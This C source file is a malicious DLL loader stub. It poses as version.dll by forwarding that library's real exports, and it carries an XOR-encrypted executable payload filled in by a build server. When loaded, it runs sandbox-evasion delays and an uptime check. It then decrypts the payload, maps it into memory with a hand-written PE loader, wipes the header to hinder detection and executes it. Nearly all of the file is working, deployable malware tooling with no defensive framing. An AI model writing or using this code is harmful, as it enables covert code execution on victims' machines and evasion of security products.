/*
 * C DLL stub — proxies version.dll exports and loads an encrypted PE payload.
 *
 * Placeholders replaced by the build server at compile time:
 *   %%XOR_KEY%%      → { 0xAB, 0xCD, ... }   (key bytes)
 *   %%KEY_LEN%%      → integer literal
 *   %%PAYLOAD%%      → { 0xAB, 0xCD, ... }   (encrypted PE bytes)
 *   %%PAYLOAD_LEN%%  → integer literal
 *
 * Compiled with:
 *   x86_64-w64-mingw32-gcc -O2 -shared -o out.dll version_stub.c \
 *       -lkernel32 -lntdll -s -fvisibility=hidden
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdint.h>
#include <string.h>

/* ── embedded encrypted payload ──────────────────────────────────────────── */

static const uint8_t XOR_KEY[%%KEY_LEN%%] = %%XOR_KEY%%;
static const uint8_t ENC_PAYLOAD[%%PAYLOAD_LEN%%] = %%PAYLOAD%%;

/* ── version.dll real-DLL forwarding ─────────────────────────────────────── */

static HMODULE g_real = NULL;

static HMODULE real_dll(void) {
    if (g_real) return g_real;
    char sys[MAX_PATH];
    GetSystemDirectoryA(sys, sizeof(sys) - 16);
    lstrcatA(sys, "\\version.dll");
    g_real = LoadLibraryA(sys);
    return g_real;
}

static FARPROC real_proc(const char *name) {
    HMODULE h = real_dll();
    return h ? GetProcAddress(h, name) : NULL;
}

__declspec(dllexport) BOOL WINAPI GetFileVersionInfoA(LPCSTR f, DWORD h, DWORD l, LPVOID d) {
    typedef BOOL(WINAPI *fn_t)(LPCSTR, DWORD, DWORD, LPVOID);
    fn_t fn = (fn_t)real_proc("GetFileVersionInfoA");
    return fn ? fn(f, h, l, d) : FALSE;
}
__declspec(dllexport) BOOL WINAPI GetFileVersionInfoW(LPCWSTR f, DWORD h, DWORD l, LPVOID d) {
    typedef BOOL(WINAPI *fn_t)(LPCWSTR, DWORD, DWORD, LPVOID);
    fn_t fn = (fn_t)real_proc("GetFileVersionInfoW");
    return fn ? fn(f, h, l, d) : FALSE;
}
__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeA(LPCSTR f, LPDWORD h) {
    typedef DWORD(WINAPI *fn_t)(LPCSTR, LPDWORD);
    fn_t fn = (fn_t)real_proc("GetFileVersionInfoSizeA");
    return fn ? fn(f, h) : 0;
}
__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeW(LPCWSTR f, LPDWORD h) {
    typedef DWORD(WINAPI *fn_t)(LPCWSTR, LPDWORD);
    fn_t fn = (fn_t)real_proc("GetFileVersionInfoSizeW");
    return fn ? fn(f, h) : 0;
}
__declspec(dllexport) BOOL WINAPI VerQueryValueA(LPCVOID b, LPCSTR s, LPVOID *pp, PUINT l) {
    typedef BOOL(WINAPI *fn_t)(LPCVOID, LPCSTR, LPVOID*, PUINT);
    fn_t fn = (fn_t)real_proc("VerQueryValueA");
    return fn ? fn(b, s, pp, l) : FALSE;
}
__declspec(dllexport) BOOL WINAPI VerQueryValueW(LPCVOID b, LPCWSTR s, LPVOID *pp, PUINT l) {
    typedef BOOL(WINAPI *fn_t)(LPCVOID, LPCWSTR, LPVOID*, PUINT);
    fn_t fn = (fn_t)real_proc("VerQueryValueW");
    return fn ? fn(b, s, pp, l) : FALSE;
}
__declspec(dllexport) DWORD WINAPI GetFileVersionInfoExA(DWORD f, LPCSTR n, DWORD h, DWORD l, LPVOID d) {
    typedef DWORD(WINAPI *fn_t)(DWORD, LPCSTR, DWORD, DWORD, LPVOID);
    fn_t fn = (fn_t)real_proc("GetFileVersionInfoExA");
    return fn ? fn(f, n, h, l, d) : 0;
}
__declspec(dllexport) DWORD WINAPI GetFileVersionInfoExW(DWORD f, LPCWSTR n, DWORD h, DWORD l, LPVOID d) {
    typedef DWORD(WINAPI *fn_t)(DWORD, LPCWSTR, DWORD, DWORD, LPVOID);
    fn_t fn = (fn_t)real_proc("GetFileVersionInfoExW");
    return fn ? fn(f, n, h, l, d) : 0;
}
__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeExA(DWORD f, LPCSTR n, LPDWORD h) {
    typedef DWORD(WINAPI *fn_t)(DWORD, LPCSTR, LPDWORD);
    fn_t fn = (fn_t)real_proc("GetFileVersionInfoSizeExA");
    return fn ? fn(f, n, h) : 0;
}
__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeExW(DWORD f, LPCWSTR n, LPDWORD h) {
    typedef DWORD(WINAPI *fn_t)(DWORD, LPCWSTR, LPDWORD);
    fn_t fn = (fn_t)real_proc("GetFileVersionInfoSizeExW");
    return fn ? fn(f, n, h) : 0;
}

/* ── minimal in-memory PE loader ─────────────────────────────────────────── */

static void load_pe(uint8_t *pe, size_t len) {
    (void)len;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)pe;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;
    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(pe + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;

    /* allocate image */
    uint8_t *base = (uint8_t *)VirtualAlloc(
        (LPVOID)(uintptr_t)nt->OptionalHeader.ImageBase,
        nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!base)
        base = (uint8_t *)VirtualAlloc(NULL, nt->OptionalHeader.SizeOfImage,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!base) return;

    /* copy headers */
    memcpy(base, pe, nt->OptionalHeader.SizeOfHeaders);

    /* copy sections */
    IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)((uint8_t *)nt + sizeof(*nt));
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData)
            memcpy(base + sec[i].VirtualAddress,
                   pe + sec[i].PointerToRawData,
                   sec[i].SizeOfRawData);
    }

    /* relocations */
    int64_t delta = (int64_t)(base - (uint8_t *)(uintptr_t)nt->OptionalHeader.ImageBase);
    if (delta) {
        IMAGE_DATA_DIRECTORY *rd = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        IMAGE_BASE_RELOCATION *blk = (IMAGE_BASE_RELOCATION *)(base + rd->VirtualAddress);
        while (blk->VirtualAddress) {
            uint16_t *ent = (uint16_t *)((uint8_t *)blk + sizeof(*blk));
            int cnt = (blk->SizeOfBlock - (int)sizeof(*blk)) / 2;
            for (int i = 0; i < cnt; i++) {
                int type = ent[i] >> 12, off = ent[i] & 0xFFF;
                if (type == 3) /* HIGHLOW */
                    *(uint32_t *)(base + blk->VirtualAddress + off) += (uint32_t)delta;
                else if (type == 10) /* DIR64 */
                    *(uint64_t *)(base + blk->VirtualAddress + off) += (uint64_t)delta;
            }
            blk = (IMAGE_BASE_RELOCATION *)((uint8_t *)blk + blk->SizeOfBlock);
        }
    }

    /* imports */
    IMAGE_DATA_DIRECTORY *idir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    IMAGE_IMPORT_DESCRIPTOR *imp = (IMAGE_IMPORT_DESCRIPTOR *)(base + idir->VirtualAddress);
    while (imp->Name) {
        HMODULE hm = LoadLibraryA((char *)(base + imp->Name));
        uint64_t *iat = (uint64_t *)(base + imp->FirstThunk);
        uint64_t *orig = (uint64_t *)(base + imp->OriginalFirstThunk);
        while (*orig) {
            FARPROC fn;
            if (*orig & IMAGE_ORDINAL_FLAG64)
                fn = GetProcAddress(hm, (LPCSTR)(*orig & 0xFFFF));
            else
                fn = GetProcAddress(hm, ((IMAGE_IMPORT_BY_NAME *)(base + *orig))->Name);
            *iat = (uint64_t)(uintptr_t)fn;
            iat++; orig++;
        }
        imp++;
    }

    /* set section permissions */
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD ch = sec[i].Characteristics, prot = PAGE_READONLY;
        if (ch & IMAGE_SCN_MEM_EXECUTE)
            prot = (ch & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        else if (ch & IMAGE_SCN_MEM_WRITE)
            prot = PAGE_READWRITE;
        DWORD old;
        VirtualProtect(base + sec[i].VirtualAddress, sec[i].Misc.VirtualSize, prot, &old);
    }

    /* wipe PE header in memory */
    DWORD old;
    VirtualProtect(base, 0x1000, PAGE_READWRITE, &old);
    memset(base, 0, 0x1000);
    VirtualProtect(base, 0x1000, PAGE_READONLY, &old);

    /* call entry point */
    typedef void (*ep_t)(void);
    ((ep_t)(base + nt->OptionalHeader.AddressOfEntryPoint))();
}

/* ── loader thread ───────────────────────────────────────────────────────── */

static DWORD WINAPI loader_thread(LPVOID param) {
    (void)param;
    /* jitter: 400-800 ms, evades sandbox short-execution heuristics */
    Sleep(400 + (GetTickCount() % 400));

    /* anti-sandbox: check for minimum uptime (real machines run > 5 min) */
    if (GetTickCount() < 5 * 60 * 1000) {
        Sleep(5 * 60 * 1000 - GetTickCount() + 100);
    }

    size_t plen = %%PAYLOAD_LEN%%;
    uint8_t *buf = (uint8_t *)VirtualAlloc(NULL, plen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return 1;

    /* XOR decrypt */
    size_t klen = %%KEY_LEN%%;
    for (size_t i = 0; i < plen; i++)
        buf[i] = ENC_PAYLOAD[i] ^ XOR_KEY[i % klen];

    load_pe(buf, plen);

    /* zero and free decrypted buffer */
    SecureZeroMemory(buf, plen);
    VirtualFree(buf, 0, MEM_RELEASE);
    return 0;
}

/* ── DllMain ─────────────────────────────────────────────────────────────── */

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    (void)lpvReserved;
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        /* pre-load real DLL so exports work immediately */
        real_dll();
        /* start loader on a background thread — never block DllMain */
        CreateThread(NULL, 0, loader_thread, NULL, 0, NULL);
    }
    return TRUE;
}
